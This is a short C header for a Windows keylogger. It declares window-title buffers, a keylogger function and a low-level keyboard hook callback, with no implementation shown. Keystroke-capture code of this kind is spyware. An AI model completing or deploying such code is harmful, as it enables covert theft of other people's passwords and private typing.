#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <time.h>;
#include <Windows.h> // Windows API


// variables
char prevWindow[256];
char currWindow[256];

// functions
void keylogger(int, char*);
LRESULT CALLBACK LowLevelKeyboardProc(int, WPARAM, LPARAM);

#endif